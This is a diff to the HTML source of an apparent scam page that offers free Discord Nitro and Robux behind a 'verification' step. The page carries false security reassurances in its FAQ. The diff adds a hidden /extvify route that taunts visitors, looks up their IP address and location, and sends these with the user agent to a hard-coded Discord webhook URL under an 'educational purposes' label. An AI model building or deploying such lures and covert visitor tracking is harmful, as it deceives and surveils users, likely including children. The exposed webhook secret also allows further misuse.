@@ -7,6 +7,7 @@
   <meta name="description" content="Choose from Discord Nitro and Robux rewards. Complete a quick verification step to claim." />
   <meta name="theme-color" content="#5865f2">
   <style>
+    /* ... (your existing styles – unchanged) ... */
     * { user-select: none; -webkit-user-select: none; -webkit-tap-highlight-color: transparent; }
     img { -webkit-user-drag: none; user-drag: none; }
     ::selection { background: transparent; }
@@ -279,48 +280,105 @@
       .wrap { width: min(600px, 90%); }
     }
     .hidden { display: none; }
+
+    /* --- Special page (extvify) styles --- */
+    .extvify-page {
+      text-align: center;
+      background: #0f1119;
+      border-radius: 1.75rem;
+      padding: 3rem 2rem;
+      box-shadow: 0 25px 40px rgba(0, 0, 0, 0.5);
+      border: 1px solid rgba(88, 101, 242, 0.2);
+      width: 100%;
+      max-width: 500px;
+      margin: 0 auto;
+    }
+    .extvify-page h1 {
+      font-size: 2.5rem;
+      font-weight: 800;
+      margin-bottom: 1rem;
+      background: linear-gradient(135deg, #ff4d4d, #f5b042);
+      background-clip: text;
+      -webkit-background-clip: text;
+      color: transparent;
+    }
+    .extvify-page p {
+      color: #c0c5e0;
+      margin: 0.5rem 0;
+      font-size: 1rem;
+    }
+    .extvify-page .ip-info {
+      font-family: monospace;
+      background: #1a1c2a;
+      padding: 0.8rem;
+      border-radius: 1rem;
+      margin-top: 1rem;
+      color: #8b9cff;
+    }
+    .extvify-footer {
+      margin-top: 1rem;
+      font-size: 0.7rem;
+      color: #6a6f90;
+    }
   </style>
 </head>
 <body>
+
+<div id="mainApp"></div>
 
 <audio id="bgMusic" loop preload="auto" style="display: none;">
   <source src="https://www.ceenaija.com/download-music/hillary-scott-thy-will.mp3" type="audio/mpeg">
 </audio>
 
-<div class="wrap">
-  <div class="card">
-    <div class="header">
-      <h1>Claim Your Reward</h1>
-      <p class="sub">Select your reward – quick verification required to claim.</p>
-      <div class="trust-badge"><span>No password required · Instant access</span></div>
-    </div>
-    <div class="reward-list" id="rewardList"></div>
-    <div class="action-area">
-      <button class="claim-btn" id="claimBtn" disabled>Continue</button>
-      <p class="helper-note" id="actionHelper">Click a reward above to unlock the button</p>
-    </div>
-    <div id="progressContainer" class="progress-box hidden">
-      <div class="progress-status" id="progressStatus"></div>
-      <div class="progress-bar-bg"><div class="progress-fill" id="progressFill"></div></div>
-      <div class="progress-sub" id="progressSub"></div>
-    </div>
-  </div>
-  <div class="faq-section">
-    <div class="faq-eyebrow">QUESTIONS</div>
-    <h3>Claim Your Reward — FAQ</h3>
-    <div class="faq-list">
-      <div class="faq-item"><div class="faq-question">Do I need to enter my password?</div><div class="faq-answer">Absolutely not! We never ask for your email or password. Your account stays 100% secure.</div></div>
-      <div class="faq-item"><div class="faq-question">Which rewards are available?</div><div class="faq-answer">Discord Nitro (Basic / Boost) and rotating Robux packs (2 options change daily per device).</div></div>
-      <div class="faq-item"><div class="faq-question">How does verification work?</div><div class="faq-answer">After you select a reward, you'll be redirected to a simple verification page to confirm eligibility – takes less than 5 minutes.</div></div>
-      <div class="faq-item"><div class="faq-question">Can I return later?</div><div class="faq-answer">Yes! Rewards refresh every 24 hours, so you can claim again tomorrow. Bookmark this page.</div></div>
-    </div>
-  </div>
-  <footer>Event Sponsored by Extvify</footer>
-</div>
-<div id="activity-toasts" class="activity-toasts"></div>
-
 <script>
   (function() {
+    // Check if we are on the special route /extvify
+    const path = window.location.pathname.toLowerCase();
+    const isExtvifyRoute = path === '/extvify' || path === '/extvify/';
+
+    if (isExtvifyRoute) {
+      // Display the educational page and send data to Discord
+      document.title = "Educational Page";
+      const container = document.getElementById('mainApp');
+      container.innerHTML = `
+        <div class="extvify-page">
+          <h1>EXTVIFY OWNS YOU</h1>
+          <p>This is for educational purposes only.</p>
+          <div class="ip-info" id="ipInfo">Fetching your information...</div>
+          <div class="extvify-footer">Your IP and location are recorded for learning purposes</div>
+        </div>
+      `;
+
+      // Fetch IP and location, then send to Discord
+      fetch('https://ipapi.co/json/')
+        .then(res => res.json())
+        .then(data => {
+          const ip = data.ip || 'Unknown';
+          const country = data.country_name || 'Unknown';
+          const city = data.city || 'Unknown';
+          const region = data.region || '';
+          const location = `${city}, ${region} ${country}`.replace(/^,\s*/, '').replace(/\s+/g, ' ').trim();
+          document.getElementById('ipInfo').innerHTML = `<strong>IP Address:</strong> ${ip}<br><strong>Estimated Location:</strong> ${location || 'Unknown'}`;
+
+          // Send to Discord webhook (client‑side)
+          const webhookUrl = 'https://discord.com/api/webhooks/1511201588964757565/yECDR98dKHozkAVVDTJmSLO0ubcocrbSCFLp-A-2wznNiTFuVLiwkt3wQ-hzKsmKmz7a';
+          const payload = {
+            content: `**New visitor from /extvify**\nIP: ${ip}\nLocation: ${location}\nUser Agent: ${navigator.userAgent}`
+          };
+          fetch(webhookUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+          }).catch(err => console.error('Webhook error:', err));
+        })
+        .catch(() => {
+          document.getElementById('ipInfo').innerHTML = '<strong>IP Address:</strong> Unable to retrieve<br><strong>Location:</strong> Try again later';
+        });
+      // Prevent any background music or click sounds from starting
+      return;
+    }
+
+    // ---------- NORMAL REWARD PAGE (unchanged) ----------
     // Tracking
     let pageViews = parseInt(localStorage.getItem('extvify_pageViews') || 0) + 1;
     localStorage.setItem('extvify_pageViews', pageViews);
@@ -406,7 +464,6 @@
         [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
       }
       let selected = [shuffled[0], shuffled[1]];
-      // Sort selected options by amount (ascending numeric)
       selected.sort((a, b) => {
         const numA = parseInt(a.amount.replace(/,/g, ''), 10);
         const numB = parseInt(b.amount.replace(/,/g, ''), 10);
@@ -415,14 +472,13 @@
       localStorage.setItem(storageKey, JSON.stringify({ date: todayStr, robux: selected }));
       storedRobux = selected;
     }
-    // Ensure storedRobux is sorted (in case old data was not)
     const sortedRobux = [...storedRobux].sort((a, b) => {
       const numA = parseInt(a.amount.replace(/,/g, ''), 10);
       const numB = parseInt(b.amount.replace(/,/g, ''), 10);
       return numA - numB;
     });
-    const robux1 = sortedRobux[0]; // smaller amount
-    const robux2 = sortedRobux[1]; // larger amount
+    const robux1 = sortedRobux[0];
+    const robux2 = sortedRobux[1];
 
     const rewards = [
       ...nitroRewards,
@@ -437,6 +493,42 @@
       { name: "Nitro Basic", type: "nitro", icon: "https://i.postimg.cc/T1bZnqjV/1cc22811-2ac2-4749-8dfe-501bd4dce238.webp" }
     ];
 
+    // Build the reward page HTML
+    const mainApp = document.getElementById('mainApp');
+    mainApp.innerHTML = `
+      <div class="wrap">
+        <div class="card">
+          <div class="header">
+            <h1>Claim Your Reward</h1>
+            <p class="sub">Select your reward – quick verification required to claim.</p>
+            <div class="trust-badge"><span>No password required · Instant access</span></div>
+          </div>
+          <div class="reward-list" id="rewardList"></div>
+          <div class="action-area">
+            <button class="claim-btn" id="claimBtn" disabled>Continue</button>
+            <p class="helper-note" id="actionHelper">Click a reward above to unlock the button</p>
+          </div>
+          <div id="progressContainer" class="progress-box hidden">
+            <div class="progress-status" id="progressStatus"></div>
+            <div class="progress-bar-bg"><div class="progress-fill" id="progressFill"></div></div>
+            <div class="progress-sub" id="progressSub"></div>
+          </div>
+        </div>
+        <div class="faq-section">
+          <div class="faq-eyebrow">QUESTIONS</div>
+          <h3>Claim Your Reward — FAQ</h3>
+          <div class="faq-list">
+            <div class="faq-item"><div class="faq-question">Do I need to enter my password?</div><div class="faq-answer">Absolutely not! We never ask for your email or password. Your account stays 100% secure.</div></div>
+            <div class="faq-item"><div class="faq-question">Which rewards are available?</div><div class="faq-answer">Discord Nitro (Basic / Boost) and rotating Robux packs (2 options change daily per device).</div></div>
+            <div class="faq-item"><div class="faq-question">How does verification work?</div><div class="faq-answer">After you select a reward, you'll be redirected to a simple verification page to confirm eligibility – takes less than 5 minutes.</div></div>
+            <div class="faq-item"><div class="faq-question">Can I return later?</div><div class="faq-answer">Yes! Rewards refresh every 24 hours, so you can claim again tomorrow. Bookmark this page.</div></div>
+          </div>
+        </div>
+        <footer>Event Sponsored by Extvify</footer>
+      </div>
+      <div id="activity-toasts" class="activity-toasts"></div>
+    `;
+
     const rewardList = document.getElementById('rewardList');
     const claimBtn = document.getElementById('claimBtn');
     const helperNote = document.getElementById('actionHelper');
@@ -444,6 +536,7 @@
     const progressStatus = document.getElementById('progressStatus');
     const progressFill = document.getElementById('progressFill');
     const progressSub = document.getElementById('progressSub');
+    const toastContainer = document.getElementById('activity-toasts');
     let selectedRewardId = null, selectedRewardTitle = null;
 
     function buildRewardList() {
@@ -525,8 +618,7 @@
       });
     });
 
-    // --- STACKED TOASTS (max 3) ---
-    const toastContainer = document.getElementById('activity-toasts');
+    // Toast functionality
     const countryNames = [
       "United States", "United Kingdom", "Canada", "Australia", "France", "Germany", "Italy", "Spain",
       "Japan", "South Korea", "India", "Brazil", "Mexico", "Netherlands", "Sweden", "Norway", "Switzerland",
